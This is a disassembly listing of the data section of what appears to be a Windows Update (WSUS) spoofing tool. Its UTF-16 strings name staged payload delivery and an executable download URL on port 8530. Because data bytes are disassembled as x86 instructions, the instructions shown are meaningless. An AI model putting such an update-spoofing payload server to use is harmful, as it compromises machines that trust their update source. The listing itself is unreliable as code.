  40bca7:	00 61 00             	add    %ah,0x0(%ecx)
  40bcaa:	72 00                	jb     0x40bcac
  40bcac:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40bcb0:	61                   	popa
  40bcb1:	00 72 00             	add    %dh,0x0(%edx)
  40bcb4:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40bcb8:	44                   	inc    %esp
  40bcb9:	00 73 00             	add    %dh,0x0(%ebx)
  40bcbc:	3e 00 00             	add    %al,%ds:(%eax)
  40bcbf:	43                   	inc    %ebx
  40bcc0:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  40bcc5:	00 2d 00 20 00 47    	add    %ch,0x47002000
  40bccb:	00 6f 00             	add    %ch,0x0(%edi)
  40bcce:	74 00                	je     0x40bcd0
  40bcd0:	20 00                	and    %al,(%eax)
  40bcd2:	72 00                	jb     0x40bcd4
  40bcd4:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40bcd8:	75 00                	jne    0x40bcda
  40bcda:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bcde:	74 00                	je     0x40bce0
  40bce0:	20 00                	and    %al,(%eax)
  40bce2:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bce6:	72 00                	jb     0x40bce8
  40bce8:	20 00                	and    %al,(%eax)
  40bcea:	73 00                	jae    0x40bcec
  40bcec:	74 00                	je     0x40bcee
  40bcee:	61                   	popa
  40bcef:	00 67 00             	add    %ah,0x0(%edi)
  40bcf2:	65 00 20             	add    %ah,%gs:(%eax)
  40bcf5:	00 31                	add    %dh,(%ecx)
  40bcf7:	00 20                	add    %ah,(%eax)
  40bcf9:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40bcff:	00 2d 00 01 1b 3c    	add    %ch,0x3c1b0100
  40bd05:	00 72 00             	add    %dh,0x0(%edx)
  40bd08:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40bd0c:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  40bd12:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd13:	00 6e 00             	add    %ch,0x0(%esi)
  40bd16:	49                   	dec    %ecx
  40bd17:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40bd1b:	00 3e                	add    %bh,(%esi)
  40bd1d:	00 00                	add    %al,(%eax)
  40bd1f:	43                   	inc    %ebx
  40bd20:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  40bd25:	00 2d 00 20 00 47    	add    %ch,0x47002000
  40bd2b:	00 6f 00             	add    %ch,0x0(%edi)
  40bd2e:	74 00                	je     0x40bd30
  40bd30:	20 00                	and    %al,(%eax)
  40bd32:	72 00                	jb     0x40bd34
  40bd34:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40bd38:	75 00                	jne    0x40bd3a
  40bd3a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bd3e:	74 00                	je     0x40bd40
  40bd40:	20 00                	and    %al,(%eax)
  40bd42:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bd46:	72 00                	jb     0x40bd48
  40bd48:	20 00                	and    %al,(%eax)
  40bd4a:	73 00                	jae    0x40bd4c
  40bd4c:	74 00                	je     0x40bd4e
  40bd4e:	61                   	popa
  40bd4f:	00 67 00             	add    %ah,0x0(%edi)
  40bd52:	65 00 20             	add    %ah,%gs:(%eax)
  40bd55:	00 32                	add    %dh,(%edx)
  40bd57:	00 20                	add    %ah,(%eax)
  40bd59:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40bd5f:	00 2d 00 01 71 3d    	add    %ch,0x3d710100
  40bd65:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bd6b:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bd71:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bd77:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bd7d:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bd83:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bd89:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bd8f:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bd95:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bd9b:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bda1:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bda7:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bdad:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bdb3:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bdb9:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bdbf:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bdc5:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bdcb:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40bdd1:	00 3d 00 00 71 20    	add    %bh,0x20710000
  40bdd7:	00 52 00             	add    %dl,0x0(%edx)
  40bdda:	45                   	inc    %ebp
  40bddb:	00 51 00             	add    %dl,0x0(%ecx)
  40bdde:	55                   	push   %ebp
  40bddf:	00 45 00             	add    %al,0x0(%ebp)
  40bde2:	53                   	push   %ebx
  40bde3:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bde7:	00 20                	add    %ah,(%eax)
  40bde9:	00 20                	add    %ah,(%eax)
  40bdeb:	00 20                	add    %ah,(%eax)
  40bded:	00 20                	add    %ah,(%eax)
  40bdef:	00 20                	add    %ah,(%eax)
  40bdf1:	00 20                	add    %ah,(%eax)
  40bdf3:	00 20                	add    %ah,(%eax)
  40bdf5:	00 20                	add    %ah,(%eax)
  40bdf7:	00 20                	add    %ah,(%eax)
  40bdf9:	00 20                	add    %ah,(%eax)
  40bdfb:	00 20                	add    %ah,(%eax)
  40bdfd:	00 20                	add    %ah,(%eax)
  40bdff:	00 20                	add    %ah,(%eax)
  40be01:	00 20                	add    %ah,(%eax)
  40be03:	00 20                	add    %ah,(%eax)
  40be05:	00 20                	add    %ah,(%eax)
  40be07:	00 20                	add    %ah,(%eax)
  40be09:	00 20                	add    %ah,(%eax)
  40be0b:	00 20                	add    %ah,(%eax)
  40be0d:	00 20                	add    %ah,(%eax)
  40be0f:	00 20                	add    %ah,(%eax)
  40be11:	00 20                	add    %ah,(%eax)
  40be13:	00 20                	add    %ah,(%eax)
  40be15:	00 20                	add    %ah,(%eax)
  40be17:	00 20                	add    %ah,(%eax)
  40be19:	00 20                	add    %ah,(%eax)
  40be1b:	00 20                	add    %ah,(%eax)
  40be1d:	00 20                	add    %ah,(%eax)
  40be1f:	00 20                	add    %ah,(%eax)
  40be21:	00 20                	add    %ah,(%eax)
  40be23:	00 20                	add    %ah,(%eax)
  40be25:	00 20                	add    %ah,(%eax)
  40be27:	00 20                	add    %ah,(%eax)
  40be29:	00 20                	add    %ah,(%eax)
  40be2b:	00 20                	add    %ah,(%eax)
  40be2d:	00 20                	add    %ah,(%eax)
  40be2f:	00 20                	add    %ah,(%eax)
  40be31:	00 20                	add    %ah,(%eax)
  40be33:	00 20                	add    %ah,(%eax)
  40be35:	00 20                	add    %ah,(%eax)
  40be37:	00 20                	add    %ah,(%eax)
  40be39:	00 20                	add    %ah,(%eax)
  40be3b:	00 20                	add    %ah,(%eax)
  40be3d:	00 20                	add    %ah,(%eax)
  40be3f:	00 20                	add    %ah,(%eax)
  40be41:	00 20                	add    %ah,(%eax)
  40be43:	00 20                	add    %ah,(%eax)
  40be45:	00 00                	add    %al,(%eax)
  40be47:	09 2e                	or     %ebp,(%esi)
  40be49:	00 65 00             	add    %ah,0x0(%ebp)
  40be4c:	78 00                	js     0x40be4e
  40be4e:	65 00 00             	add    %al,%gs:(%eax)
  40be51:	49                   	dec    %ecx
  40be52:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  40be57:	00 2d 00 20 00 54    	add    %ch,0x54002000
  40be5d:	00 68 00             	add    %ch,0x0(%eax)
  40be60:	65 00 20             	add    %ah,%gs:(%eax)
  40be63:	00 70 00             	add    %dh,0x0(%eax)
  40be66:	61                   	popa
  40be67:	00 79 00             	add    %bh,0x0(%ecx)
  40be6a:	6c                   	insb   (%dx),%es:(%edi)
  40be6b:	00 6f 00             	add    %ch,0x0(%edi)
  40be6e:	61                   	popa
  40be6f:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40be73:	00 69 00             	add    %ch,0x0(%ecx)
  40be76:	73 00                	jae    0x40be78
  40be78:	20 00                	and    %al,(%eax)
  40be7a:	6f                   	outsl  %ds:(%esi),(%dx)
  40be7b:	00 6e 00             	add    %ch,0x0(%esi)
  40be7e:	20 00                	and    %al,(%eax)
  40be80:	74 00                	je     0x40be82
  40be82:	68 00 65 00 20       	push   $0x20006500
  40be87:	00 77 00             	add    %dh,0x0(%edi)
  40be8a:	61                   	popa
  40be8b:	00 79 00             	add    %bh,0x0(%ecx)
  40be8e:	2e 00 20             	add    %ah,%cs:(%eax)
  40be91:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40be97:	00 2d 00 01 27 2d    	add    %ch,0x2d270100
  40be9d:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40bea3:	00 20                	add    %ah,(%eax)
  40bea5:	00 41 00             	add    %al,0x0(%ecx)
  40bea8:	6c                   	insb   (%dx),%es:(%edi)
  40bea9:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bead:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40beb1:	00 6e 00             	add    %ch,0x0(%esi)
  40beb4:	65 00 2e             	add    %ch,%gs:(%esi)
  40beb7:	00 20                	add    %ah,(%eax)
  40beb9:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40bebf:	00 2d 00 01 35 41    	add    %ch,0x41350100
  40bec5:	00 63 00             	add    %ah,0x0(%ebx)
  40bec8:	74 00                	je     0x40beca
  40beca:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40bed0:	20 00                	and    %al,(%eax)
  40bed2:	53                   	push   %ebx
  40bed3:	00 65 00             	add    %ah,0x0(%ebp)
  40bed6:	72 00                	jb     0x40bed8
  40bed8:	76 00                	jbe    0x40beda
  40beda:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bede:	20 00                	and    %al,(%eax)
  40bee0:	43                   	inc    %ebx
  40bee1:	00 6f 00             	add    %ch,0x0(%edi)
  40bee4:	6e                   	outsb  %ds:(%esi),(%dx)
  40bee5:	00 6e 00             	add    %ch,0x0(%esi)
  40bee8:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40beec:	74 00                	je     0x40beee
  40beee:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bef4:	73 00                	jae    0x40bef6
  40bef6:	3a 00                	cmp    (%eax),%al
  40bef8:	00 15 4e 00 65 00    	add    %dl,0x65004e
  40befe:	77 00                	ja     0x40bf00
  40bf00:	55                   	push   %ebp
  40bf01:	00 70 00             	add    %dh,0x0(%eax)
  40bf04:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bf08:	74 00                	je     0x40bf0a
  40bf0a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bf0e:	00 1d 43 00 68 00    	add    %bl,0x680043
  40bf14:	61                   	popa
  40bf15:	00 6e 00             	add    %ch,0x0(%esi)
  40bf18:	67 00 65 00          	add    %ah,0x0(%di)
  40bf1c:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40bf20:	70 00                	jo     0x40bf22
  40bf22:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bf26:	74 00                	je     0x40bf28
  40bf28:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bf2c:	00 2b                	add    %ch,(%ebx)
  40bf2e:	4f                   	dec    %edi
  40bf2f:	00 75 00             	add    %dh,0x0(%ebp)
  40bf32:	74 00                	je     0x40bf34
  40bf34:	4f                   	dec    %edi
  40bf35:	00 66 00             	add    %ah,0x0(%esi)
  40bf38:	53                   	push   %ebx
  40bf39:	00 63 00             	add    %ah,0x0(%ebx)
  40bf3c:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf3d:	00 70 00             	add    %dh,0x0(%eax)
  40bf40:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40bf44:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40bf48:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  40bf4e:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf4f:	00 6e 00             	add    %ch,0x0(%esi)
  40bf52:	49                   	dec    %ecx
  40bf53:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40bf57:	00 00                	add    %al,(%eax)
  40bf59:	2b 3c 00             	sub    (%eax,%eax,1),%edi
  40bf5c:	4e                   	dec    %esi
  40bf5d:	00 65 00             	add    %ah,0x0(%ebp)
  40bf60:	77 00                	ja     0x40bf62
  40bf62:	55                   	push   %ebp
  40bf63:	00 70 00             	add    %dh,0x0(%eax)
  40bf66:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bf6a:	74 00                	je     0x40bf6c
  40bf6c:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bf70:	20 00                	and    %al,(%eax)
  40bf72:	78 00                	js     0x40bf74
  40bf74:	6d                   	insl   (%dx),%es:(%edi)
  40bf75:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40bf79:	00 73 00             	add    %dh,0x0(%ebx)
  40bf7c:	3d 00 22 00 22       	cmp    $0x22002200,%eax
  40bf81:	00 3e                	add    %bh,(%esi)
  40bf83:	00 00                	add    %al,(%eax)
  40bf85:	19 3c 00             	sbb    %edi,(%eax,%eax,1)
  40bf88:	4e                   	dec    %esi
  40bf89:	00 65 00             	add    %ah,0x0(%ebp)
  40bf8c:	77 00                	ja     0x40bf8e
  40bf8e:	55                   	push   %ebp
  40bf8f:	00 70 00             	add    %dh,0x0(%eax)
  40bf92:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bf96:	74 00                	je     0x40bf98
  40bf98:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bf9c:	3e 00 00             	add    %al,%ds:(%eax)
  40bf9f:	41                   	inc    %ecx
  40bfa0:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  40bfa5:	00 2d 00 20 00 46    	add    %ch,0x46002000
  40bfab:	00 69 00             	add    %ch,0x0(%ecx)
  40bfae:	72 00                	jb     0x40bfb0
  40bfb0:	73 00                	jae    0x40bfb2
  40bfb2:	74 00                	je     0x40bfb4
  40bfb4:	20 00                	and    %al,(%eax)
  40bfb6:	73 00                	jae    0x40bfb8
  40bfb8:	74 00                	je     0x40bfba
  40bfba:	61                   	popa
  40bfbb:	00 67 00             	add    %ah,0x0(%edi)
  40bfbe:	65 00 20             	add    %ah,%gs:(%eax)
  40bfc1:	00 6f 00             	add    %ch,0x0(%edi)
  40bfc4:	6e                   	outsb  %ds:(%esi),(%dx)
  40bfc5:	00 20                	add    %ah,(%eax)
  40bfc7:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40bfcb:	00 65 00             	add    %ah,0x0(%ebp)
  40bfce:	20 00                	and    %al,(%eax)
  40bfd0:	77 00                	ja     0x40bfd2
  40bfd2:	61                   	popa
  40bfd3:	00 79 00             	add    %bh,0x0(%ecx)
  40bfd6:	20 00                	and    %al,(%eax)
  40bfd8:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  40bfdd:	00 2d 00 01 71 20    	add    %ch,0x20710100
  40bfe3:	00 52 00             	add    %dl,0x0(%edx)
  40bfe6:	45                   	inc    %ebp
  40bfe7:	00 53 00             	add    %dl,0x0(%ebx)
  40bfea:	50                   	push   %eax
  40bfeb:	00 4f 00             	add    %cl,0x0(%edi)
  40bfee:	4e                   	dec    %esi
  40bfef:	00 53 00             	add    %dl,0x0(%ebx)
  40bff2:	45                   	inc    %ebp
  40bff3:	00 20                	add    %ah,(%eax)
  40bff5:	00 20                	add    %ah,(%eax)
  40bff7:	00 20                	add    %ah,(%eax)
  40bff9:	00 20                	add    %ah,(%eax)
  40bffb:	00 20                	add    %ah,(%eax)
  40bffd:	00 20                	add    %ah,(%eax)
  40bfff:	00 20                	add    %ah,(%eax)
  40c001:	00 20                	add    %ah,(%eax)
  40c003:	00 20                	add    %ah,(%eax)
  40c005:	00 20                	add    %ah,(%eax)
  40c007:	00 20                	add    %ah,(%eax)
  40c009:	00 20                	add    %ah,(%eax)
  40c00b:	00 20                	add    %ah,(%eax)
  40c00d:	00 20                	add    %ah,(%eax)
  40c00f:	00 20                	add    %ah,(%eax)
  40c011:	00 20                	add    %ah,(%eax)
  40c013:	00 20                	add    %ah,(%eax)
  40c015:	00 20                	add    %ah,(%eax)
  40c017:	00 20                	add    %ah,(%eax)
  40c019:	00 20                	add    %ah,(%eax)
  40c01b:	00 20                	add    %ah,(%eax)
  40c01d:	00 20                	add    %ah,(%eax)
  40c01f:	00 20                	add    %ah,(%eax)
  40c021:	00 20                	add    %ah,(%eax)
  40c023:	00 20                	add    %ah,(%eax)
  40c025:	00 20                	add    %ah,(%eax)
  40c027:	00 20                	add    %ah,(%eax)
  40c029:	00 20                	add    %ah,(%eax)
  40c02b:	00 20                	add    %ah,(%eax)
  40c02d:	00 20                	add    %ah,(%eax)
  40c02f:	00 20                	add    %ah,(%eax)
  40c031:	00 20                	add    %ah,(%eax)
  40c033:	00 20                	add    %ah,(%eax)
  40c035:	00 20                	add    %ah,(%eax)
  40c037:	00 20                	add    %ah,(%eax)
  40c039:	00 20                	add    %ah,(%eax)
  40c03b:	00 20                	add    %ah,(%eax)
  40c03d:	00 20                	add    %ah,(%eax)
  40c03f:	00 20                	add    %ah,(%eax)
  40c041:	00 20                	add    %ah,(%eax)
  40c043:	00 20                	add    %ah,(%eax)
  40c045:	00 20                	add    %ah,(%eax)
  40c047:	00 20                	add    %ah,(%eax)
  40c049:	00 20                	add    %ah,(%eax)
  40c04b:	00 20                	add    %ah,(%eax)
  40c04d:	00 20                	add    %ah,(%eax)
  40c04f:	00 20                	add    %ah,(%eax)
  40c051:	00 00                	add    %al,(%eax)
  40c053:	15 53 00 4f 00       	adc    $0x4f0053,%eax
  40c058:	41                   	inc    %ecx
  40c059:	00 50 00             	add    %dl,0x0(%eax)
  40c05c:	41                   	inc    %ecx
  40c05d:	00 63 00             	add    %ah,0x0(%ebx)
  40c060:	74 00                	je     0x40c062
  40c062:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c068:	00 2b                	add    %ch,(%ebx)
  40c06a:	47                   	inc    %edi
  40c06b:	00 65 00             	add    %ah,0x0(%ebp)
  40c06e:	74 00                	je     0x40c070
  40c070:	45                   	inc    %ebp
  40c071:	00 78 00             	add    %bh,0x0(%eax)
  40c074:	74 00                	je     0x40c076
  40c076:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40c07a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40c07e:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40c082:	70 00                	jo     0x40c084
  40c084:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40c088:	74 00                	je     0x40c08a
  40c08a:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40c08e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c08f:	00 66 00             	add    %ah,0x0(%esi)
  40c092:	6f                   	outsl  %ds:(%esi),(%dx)
  40c093:	00 00                	add    %al,(%eax)
  40c095:	80 8f 68 00 74 00 74 	orb    $0x74,0x740068(%edi)
  40c09c:	00 70 00             	add    %dh,0x0(%eax)
  40c09f:	3a 00                	cmp    (%eax),%al
  40c0a1:	2f                   	das
  40c0a2:	00 2f                	add    %ch,(%edi)
  40c0a4:	00 7b 00             	add    %bh,0x0(%ebx)
  40c0a7:	30 00                	xor    %al,(%eax)
  40c0a9:	7d 00                	jge    0x40c0ab
  40c0ab:	3a 00                	cmp    (%eax),%al
  40c0ad:	38 00                	cmp    %al,(%eax)
  40c0af:	35 00 33 00 30       	xor    $0x30003300,%eax
  40c0b4:	00 2f                	add    %ch,(%edi)
  40c0b6:	00 43 00             	add    %al,0x0(%ebx)
  40c0b9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0ba:	00 6e 00             	add    %ch,0x0(%esi)
  40c0bd:	74 00                	je     0x40c0bf
  40c0bf:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40c0c3:	74 00                	je     0x40c0c5
  40c0c5:	2f                   	das
  40c0c6:	00 42 00             	add    %al,0x0(%edx)
  40c0c9:	32 00                	xor    (%eax),%al
  40c0cb:	2f                   	das
  40c0cc:	00 46 00             	add    %al,0x0(%esi)
  40c0cf:	42                   	inc    %edx
  40c0d0:	00 30                	add    %dh,(%eax)
  40c0d2:	00 41 00             	add    %al,0x0(%ecx)
  40c0d5:	31 00                	xor    %eax,(%eax)
  40c0d7:	35 00 30 00 36       	xor    $0x36003000,%eax
  40c0dc:	00 30                	add    %dh,(%eax)
  40c0de:	00 31                	add    %dh,(%ecx)
  40c0e0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c0e3:	37                   	aaa
  40c0e4:	00 30                	add    %dh,(%eax)
  40c0e6:	00 31                	add    %dh,(%ecx)
  40c0e8:	00 39                	add    %bh,(%ecx)
  40c0ea:	00 35 00 43 00 34    	add    %dh,0x34004300
  40c0f0:	00 37                	add    %dh,(%edi)
  40c0f2:	00 42 00             	add    %al,0x0(%edx)
  40c0f5:	34 00                	xor    $0x0,%al
  40c0f7:	45                   	inc    %ebp
  40c0f8:	00 38                	add    %bh,(%eax)
  40c0fa:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40c0fe:	00 37                	add    %dh,(%edi)
  40c100:	00 46 00             	add    %al,0x0(%esi)
  40c103:	43                   	inc    %ebx
  40c104:	00 42 00             	add    %al,0x0(%edx)
  40c107:	33 00                	xor    (%eax),%eax
  40c109:	46                   	inc    %esi
  40c10a:	00 35 00 30 00 32    	add    %dh,0x32003000
  40c110:	00 39                	add    %bh,(%ecx)
  40c112:	00 32                	add    %dh,(%edx)
  40c114:	00 42 00             	add    %al,0x0(%edx)
  40c117:	45                   	inc    %ebp
  40c118:	00 42 00             	add    %al,0x0(%edx)
  40c11b:	32 00                	xor    (%eax),%al
  40c11d:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40c121:	78 00                	js     0x40c123
  40c123:	65 00 00             	add    %al,%gs:(%eax)
  40c126:	80 85 68 00 74 00 74 	addb   $0x74,0x740068(%ebp)
  40c12d:	00 70 00             	add    %dh,0x0(%eax)
  40c130:	3a 00                	cmp    (%eax),%al
  40c132:	2f                   	das
  40c133:	00 2f                	add    %ch,(%edi)
  40c135:	00 7b 00             	add    %bh,0x0(%ebx)
  40c138:	30 00                	xor    %al,(%eax)
  40c13a:	7d 00                	jge    0x40c13c
  40c13c:	2f                   	das
  40c13d:	00 43 00             	add    %al,0x0(%ebx)
  40c140:	6f                   	outsl  %ds:(%esi),(%dx)
  40c141:	00 6e 00             	add    %ch,0x0(%esi)
  40c144:	74 00                	je     0x40c146
  40c146:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40c14a:	74 00                	je     0x40c14c
  40c14c:	2f                   	das
  40c14d:	00 42 00             	add    %al,0x0(%edx)
  40c150:	32 00                	xor    (%eax),%al
  40c152:	2f                   	das
  40c153:	00 46 00             	add    %al,0x0(%esi)
  40c156:	42                   	inc    %edx
  40c157:	00 30                	add    %dh,(%eax)
  40c159:	00 41 00             	add    %al,0x0(%ecx)
  40c15c:	31 00                	xor    %eax,(%eax)
  40c15e:	35 00 30 00 36       	xor    $0x36003000,%eax
  40c163:	00 30                	add    %dh,(%eax)
  40c165:	00 31                	add    %dh,(%ecx)
  40c167:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c16a:	37                   	aaa
  40c16b:	00 30                	add    %dh,(%eax)
  40c16d:	00 31                	add    %dh,(%ecx)
  40c16f:	00 39                	add    %bh,(%ecx)
  40c171:	00 35 00 43 00 34    	add    %dh,0x34004300
  40c177:	00 37                	add    %dh,(%edi)
  40c179:	00 42 00             	add    %al,0x0(%edx)
  40c17c:	34 00                	xor    $0x0,%al
  40c17e:	45                   	inc    %ebp
  40c17f:	00 38                	add    %bh,(%eax)
  40c181:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40c185:	00 37                	add    %dh,(%edi)
  40c187:	00 46 00             	add    %al,0x0(%esi)
  40c18a:	43                   	inc    %ebx
  40c18b:	00 42 00             	add    %al,0x0(%edx)
  40c18e:	33 00                	xor    (%eax),%eax
  40c190:	46                   	inc    %esi
  40c191:	00 35 00 30 00 32    	add    %dh,0x32003000
  40c197:	00 39                	add    %bh,(%ecx)
  40c199:	00 32                	add    %dh,(%edx)
  40c19b:	00 42 00             	add    %al,0x0(%edx)
  40c19e:	45                   	inc    %ebp
  40c19f:	00 42 00             	add    %al,0x0(%edx)
  40c1a2:	32 00                	xor    (%eax),%al
  40c1a4:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40c1a8:	78 00                	js     0x40c1aa
  40c1aa:	65 00 00             	add    %al,%gs:(%eax)
  40c1ad:	05 4f 00 4b 00       	add    $0x4b004f,%eax
  40c1b2:	00 43 2d             	add    %al,0x2d(%ebx)
  40c1b5:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40c1bb:	00 20                	add    %ah,(%eax)
  40c1bd:	00 53 00             	add    %dl,0x0(%ebx)
  40c1c0:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c1c4:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1c5:	00 6e 00             	add    %ch,0x0(%esi)
  40c1c8:	64 00 20             	add    %ah,%fs:(%eax)
  40c1cb:	00 73 00             	add    %dh,0x0(%ebx)
  40c1ce:	74 00                	je     0x40c1d0
  40c1d0:	61                   	popa
  40c1d1:	00 67 00             	add    %ah,0x0(%edi)
  40c1d4:	65 00 20             	add    %ah,%gs:(%eax)
  40c1d7:	00 6f 00             	add    %ch,0x0(%edi)
  40c1da:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1db:	00 20                	add    %ah,(%eax)
  40c1dd:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40c1e1:	00 65 00             	add    %ah,0x0(%ebp)
  40c1e4:	20 00                	and    %al,(%eax)
  40c1e6:	77 00                	ja     0x40c1e8
  40c1e8:	61                   	popa
  40c1e9:	00 79 00             	add    %bh,0x0(%ecx)
  40c1ec:	20 00                	and    %al,(%eax)
  40c1ee:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  40c1f3:	00 2d 00 01 00 18    	add    %ch,0x18000100
  40c1f9:	ca 3a 76             	lret   $0x763a
  40c1fc:	8f                   	(bad)
  40c1fd:	3a 1a                	cmp    (%edx),%bl
  40c1ff:	40                   	inc    %eax
  40c200:	8f                   	(bad)
  40c201:	37                   	aaa
  40c202:	cf                   	iret
  40c203:	d7                   	xlat   %ds:(%ebx)
  40c204:	62 ed 0d             	(bad) {%k2}
  40c207:	02 00                	add    (%eax),%al
  40c209:	04 20                	add    $0x20,%al
  40c20b:	01 01                	add    %eax,(%ecx)
  40c20d:	08 03                	or     %al,(%ebx)
  40c20f:	20 00                	and    %al,(%eax)
  40c211:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c217:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40c21a:	01 01                	add    %eax,(%ecx)
  40c21c:	0e                   	push   %cs
  40c21d:	05 20 01 01 11       	add    $0x11010120,%eax
  40c222:	39 05 20 01 01 12    	cmp    %eax,0x12010120
  40c228:	59                   	pop    %ecx
  40c229:	05 20 01 01 12       	add    $0x12010120,%eax
  40c22e:	65 1d 07 11 15 12    	gs sbb $0x12151107,%eax
  40c234:	45                   	inc    %ebp
  40c235:	02 0e                	add    (%esi),%cl
  40c237:	0e                   	push   %cs
  40c238:	0e                   	push   %cs
  40c239:	0e                   	push   %cs
  40c23a:	02 08                	add    (%eax),%cl
  40c23c:	02 12                	add    (%edx),%dl
  40c23e:	49                   	dec    %ecx
  40c23f:	12 4d 1d             	adc    0x1d(%ebp),%cl
  40c242:	05 12 28 02 02       	add    $0x2022812,%eax
  40c247:	02 12                	add    (%edx),%dl
  40c249:	2c 02                	sub    $0x2,%al
  40c24b:	02 02                	add    (%edx),%al
  40c24d:	06                   	push   %es
  40c24e:	15 12 45 02 0e       	adc    $0xe024512,%eax
  40c253:	0e                   	push   %cs
  40c254:	05 20 01 02 13       	add    $0x13020120,%eax
  40c259:	00 06                	add    %al,(%esi)
  40c25b:	00 03                	add    %al,(%ebx)
  40c25d:	1c 0e                	sbb    $0xe,%al
  40c25f:	0e                   	push   %cs
  40c260:	1c 03                	sbb    $0x3,%al
  40c262:	20 00                	and    %al,(%eax)
  40c264:	0e                   	push   %cs
  40c265:	05 00 02 02 0e       	add    $0xe020200,%eax
  40c26a:	0e                   	push   %cs
  40c26b:	04 00                	add    $0x0,%al
  40c26d:	01 01                	add    %eax,(%ecx)
  40c26f:	0e                   	push   %cs
  40c270:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c275:	1c 06                	sbb    $0x6,%al
  40c277:	20 01                	and    %al,(%ecx)
  40c279:	13 01                	adc    (%ecx),%eax
  40c27b:	13 00                	adc    (%eax),%eax
  40c27d:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c282:	0e                   	push   %cs
  40c283:	04 00                	add    $0x0,%al
  40c285:	01 08                	add    %ecx,(%eax)
